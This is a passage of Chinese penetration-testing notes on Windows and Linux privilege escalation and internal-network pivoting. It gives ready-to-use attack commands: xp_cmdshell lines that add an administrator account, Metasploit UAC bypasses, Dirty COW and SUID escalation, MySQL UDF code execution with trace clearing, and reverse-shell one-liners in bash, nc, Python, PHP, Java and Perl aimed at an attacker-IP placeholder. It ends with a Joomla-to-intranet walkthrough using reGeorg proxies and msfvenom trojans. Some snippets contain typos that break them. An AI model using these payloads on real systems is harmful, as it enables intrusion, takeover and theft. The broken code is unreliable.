    ```exec master..xp_cmdshell 'net user name passwd /add'//添加用户name,密码passwd
    exec master..xp_cmdshell 'net localgroup administrators name /add'//添加name到管理员组
### windows bypass uac
uac(user acount control)可以阻止未授权的应用程序自动安装，并防止无意中更改系统设置
> uac的三种设置要求：
>
>   1. 始终通知
>   2. 仅在系统试图更改我的计算机时通知（Uac默认设置，第三方使用高级别权限时会提示本地用户)
>   3. 从不提示(用户为系统管理员时所有程序都会以最高权限运行)
>
相当于普通用户打开cmd和以管理员运行cmd的差别，普通用户以管理员身份开cmd就会受到uac的限制，输入管理员密码
#### msf bypass uac
前提：已经获得了目标机器的meterpreter shell，当前权限为普通用户
  * bypassuac模块通过进程注入，利用受信任的发布者证书绕过windows UAC,它将为我们生成另一个关闭UAC的shell
  * bypassuac_injection模块直接运行在内存的反射DLL中，不会接触目标机的硬盘，从而降低了被杀毒软件检测出来的概率
  * bypassuac_eventwr模块通过在当前用户配置单元下劫持注册表中的特殊键，在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC
msf exploit:>`use exploit/windows/local/bypassuac`  
然后根据msf exp对reverse_tcp(bind_tcp)、lhost等进行参数设置
#### 利用系统漏洞bypass uac
CVE编号:CVE-2019-1388,windwos证书对话框特权提升漏洞。补丁号KB4524235 KB4525233
  * 漏洞原理：此漏洞是因为UAC机制设定不严导致的。默认wdnows会在一个单独的桌面secure desktop上显示所有UAC提示。这些提示是由consent.exe的可执行文件生成的，该文件以NT AUTHORITY\SYSTEM身份运行，并有system的完整权限
> 如果在运行一个可执行文件时触发了UAC，在点击 展示证书发行者的详细信息 之后，证书里的Issued
> by字段，这个字段对应的值就是OID。证书会解析OID的值，windows没有禁用OID处的超链接，就可以利用提权
要能连3389
# Linux提权
linux提权相对于windows的手法较单一，多了一个比较重要的suid提权。有很多时候提权并不是必须进行的步骤
## linux系统提权
linux和内核提权跟windows一样，都要下载对应漏洞的脚本提权
uname -a 获取操作系统内核版本和内核架构  
id 获取用户信息
  1. 查找相关版本的内核漏洞
  2. exp搜索链接：`https://www.exploit-db.com/` (type选local)
  3. exp下载：`http://github.com/SecWiki/linux-kernel-exploits`  
（科学上网）
  4. 上传exp并编译  
exp是.c文件，上传到服务器后需要用gcc编译。.cpp用g++  
编译 `gcc pwn.c -o pwn` (exp下载文件里有对应的编译说明文档）  
运行 `./pwn`  
如果目标机没有gcc或者g++，自己没有权限也肯定不能安装。唯一的办法是在本地搭建一个和服务器内核版本相同的环境，在里面编译完成了再上传至靶机
windows提权成功后在exp后接命令就是高权限运行，但是linux提权成功是返回一个shell。脚本执行后返回shell失败，可能是需要反弹shell
#### 脏牛提权实例
  1. id查看目标机用户权限
  2. uname -a目标机的linxu kernel>=2.6.22进行脏牛提权
  3. 寻找对应exp `
  4. exp下载至目标机并编译 `gcc -pthread dirty.c -o dirty -lcrypt`
  5. 完成后，销毁firefart密码文件即可恢复root  
`mv /tmp/passwd.bak /etc/passwd`
获取shell后将shell转换为完全交互式的TTY：`python -c 'import pty;pty.spawn("/bin/bash")'`
## suid提权
此处涉及权限划分的知识。在Linux中通过权限位rwx实现文件权限管理。d目录，-普通文件。r read;w write;x execute  
所有者-所属者-其他用户
  * suid作用于二进制可执行程序上，当执行程序时会临时切换身份为文件所有者身份为文件所有者身份。  
`chmod u+s FILE\chmod 4755 FILE` 添加SUID权限到二进制文件（在三位数据权限前，4代表添加到SUID位）  
`chmod u-s FILE\chmod 0xxx FILE` 删除suid  
  * 文件属主为s表示设置了suid.没有x权限用大写S，表示权限无效
简而言之，任何用户执行有suid的文件时，都会以第一个权限运行
> 所以利用suid提权的一个小案例就是：  
>  创建一个1.c文件,代码如下：
>  
>  
>     #include
>     void main(){
>     setuid(0); #root的uid=0，意味着执行后面的代码是root权限在执行
>     system("su - root);#将当前环境转为root
>     }
>  
>
> gcc 1.c -o 1编译  
>  chmod u+s 1 添加suid  
>  ./1 执行  
>  su - root !=su root.su 只是切换了root身份，但shell环境依旧是普通用户，su - 用户和环境一起切换了。
## linux数据库提权
和windows一样的，udf提权
  * 环境要求：配置中secure_file_priv=""，  
mysql具有root权限，具有sql语句执行权限，目录可读可写，selinux关闭
先获取低权限shell,提权过程：  
  1. 查看plugin目录路径 `show variables like '%plugin%';`  
`select unhex('udf十六进制') into dumpfile 'usr/lib64/mysql/plugin/1.so';`
(plugin路径/1.so)
  2. 声明函数 `create function sys_eval returns string soname '1.so';`
  3. 执行高权限命令 `select sys_eval('whoami');`
  4. 清除痕迹 `drop function sys_eval;`
windows soname动态链接库指向udf.dll，linux指向.so文件，所以声明的函数也要是.so文件里的。  
详情请见上篇windows提权
# 反弹shell
  * 反弹shell使用场景:防火墙会阻止客户端主动连接服务器，但是服务器连接客户端通过防火墙时，可以穿透到达客户端
## nc
netcat简称nc，被称为渗透测试中的瑞士军~~~~刀。  
它可以用作端口监听、端口扫描、远程文件传输、远程shell等
  * 语法:`nc [-hlnruz][-g 网关][-G 指向器数目][-i 延迟秒数][-o 输出文件][-p 通信端口][-s 来源IP][-v 次数][-w 超时秒数][主机名称][通信端口...]`
  * 反向shell  
假设在目标主机找到了RCE漏洞，可以在目标主机上用nc发出命令启动反向shell  
  1. 在攻击机或vps上监听本地端口`nc -lvp 监听端口号`
  2. 靶机命令，连接攻击机的监听端口`nc 攻击机ip 监听端口号 -e /bin/bash` #linux  
`nc 攻击机ip 监听端口号 -e c:\windows\system32\cmd.exe` #windows  
-e:将bash shell 发回主机
  3. 正向shell  
正向shell时在目标机使用nc将bash shell绑定到特定端口，攻击机nc连接到此端口  
### **bash反弹shell**
目标主机可能没有nc或不支持-e参数时，就需要以下方式反弹shell
  * 攻击机监听:`nc -lvvp 端口`
  * 目标主机:`bash -i >& /dev/tcp/攻击机ip/监听端口号 0>&1`
> bash -i | 产生一个交互式shell  
> ---|---  
> & | 将&前后内容相结合重定向(>)至后者  
> /dev/tcp/ip/port | 对socket网络连接的抽象  
> 0>&1 | 将标准输入和标准输入内容相结合，然后重定向至标准输出内容。0标准输入、1标准输出、2错误输出  
## 其他反弹shell方式
### python反弹shell
    import soket,subprocess,os;
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击机IP",监听端口号));
    os.dup(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    p=subprocess.call(["/bin/sh","-i"]);
### php反弹shell
    $sock=fsockopen("攻击机IP",监听端口);
    exec("/bin/sh -i &3 2>&3");
### java反弹shell
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/攻击机ip/监听端口;cat &5>&5;done"] as String[])
    p.waitFor()
### perl 反弹shell
    use Socket;
    $i="攻击机IP地址";
    $p=监听端口号;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){
    (open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
    };
perl和python绝大多数服务器都会装，所以很有用
以某次内网渗透为实例
## 横向渗透预备工作
假设是如上拓扑图。先无视防火墙，内网机器无法直接访问外网，必须要走边界机。
### 获得低权限shell
  * 在网站信息搜集看到是joomla模板
  * msf里search joomla **查看** 辅助模块auxiliar里的 **扫描脚本** ：`auxiliary/scannner/http/joomla_version`
  * use脚本设置rhost参数，然后expolit运行可以看到网站版本。`expolit -j -z`挂后台
  * `searchsplopit joomla 版本` **寻找exp** ，最好是在exploit.db找，这里图个方便
  * 把脚本copy到msf的exploits/multi/php目录下，然后reload
  * use exp脚本，set rhost\rport参数和lhost\lport参数，set payload为reverse或者bind，exploit运行
目前获得了低权限shell，sessions进入shell
### 提权
  * `uname -a`查看系统信息
  * gcc --version看到有gcc，就找c语言的脚本。另起一个终端`nc --lvvp 端口`监听新端口
  * shell里`bash -i >& /dev/tcp/xx.xx.xx.xx/端口 0>&1`反弹shell
  * `searchspolit linux kernel 内核版本 --exclute="(PoC)|/dos/"`搜索本地提权脚本。除去Poc和dos，就剩本地脚本了。同理，也可以在expolit.db上找
  * 上传脚本，但是靶机的网站根目录不可写(很少见)，写到/tmp目录
  * `gcc -o 输出文件名 脚本名`编译，`./文件名`运行。不行就换脚本，脚本里有使用方法，事先看一下
提不了就别提了，不是非要提权(试李妈半天都提不起，不知道这些exp谁写的)
### 一级代理
  * 靶机`python reGeorgSocksProxy.py -u http://IP -p 代理端口`建立代理转发服务器
  * ipconfig或者其他的看下网段，`run autoroute -s 网端`开启路由转发
  * `use auxiliary/scanner/discovery`、nmap、ping扫描等扫同网端存活主机
  * 扫描端口`use auxiliary/scanner/portscan/tcp`或者nmap扫，设置一下rhost和常用端口，运行
  * `vim /etc/proxychains.conf`配置代理，浏览器开代理访问内网网站(建议foxyProxy插件)
如果开了80端口，接下来就是搞内网的站，拿内网的webshell。注意蚁剑和burpsuit等工具也要配置代理
**reGeorgSocksProxy指定的端口要和proxychains.conf文件里的端口一致**
，因为这波操作的意义就是把边界机当作跳板，regeorgsocksproxy.py在边界机起到代理服务器的作用,proxychains就是客户端
内网的站打下来了重复上述步骤到提权。
### 二层内网渗透（bind）
  * 生成msf木马`msfvenom -p windows/meterpreter/bind_tcp lport=xxx -f exe -o 文件名`，因为内网不能直接连外网的原因,reverse版木马无法使用，但是我们有代理可以连内网。上传
  * 同理，生成了木马本地就需要有msf进程监听。`use exploit/multi/handler`，然后`set payload windows/meterpreter/bind_tcp`，payload和msf木马所用payload一致，设置参数lport和rhost.（这里开监听是在边界服务器开，也就是之前msf的边界服务器终端，lport当然也是边界机的端口，相当于 ~~本机msf对靶机边界机~~ 的渗透变为了==靶机边界机对内网二层机==)
  * 在二层内网机提权运行msf木马拿到shell后，`run autoroute -s 另一内网网段`添加路由
  * 扫描，老样子，那几个扫描用啥都行，`run arp_scanner -r 网段`进行arp扫描